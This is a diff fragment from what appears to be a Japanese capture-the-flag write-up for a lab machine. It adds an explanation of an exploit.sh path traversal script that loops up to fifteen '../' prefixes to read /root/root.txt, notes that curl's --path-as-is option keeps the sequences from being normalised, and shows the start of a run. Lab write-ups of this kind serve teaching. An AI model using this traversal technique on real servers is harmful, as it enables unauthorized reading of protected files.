@@ -258,7 +258,16 @@ for ((i=0; i<15; i++)); do
         break
     fi
 done
+```
 
+このexploit.shは、パストラバーサル攻撃を試みるもの
+- 15回ループを回し、payload に "../" を追加しながら試行（ディレクトリを15階層分遡る）
+- これにより /assets/../../../../../../../../../../../root/root.txt のような形でアクセスを試みる
+- curl --path-as-is を使用
+通常、curl は "../" をURLエンコードするため、--path-as-is を指定しないと ../../ の効果が無効になる可能性がある。
+
+
+```
 rosa@chemistry:~$ bash exploit.sh 
 [+] Testing with /assets/../root/root.txt
         Status code --> 404
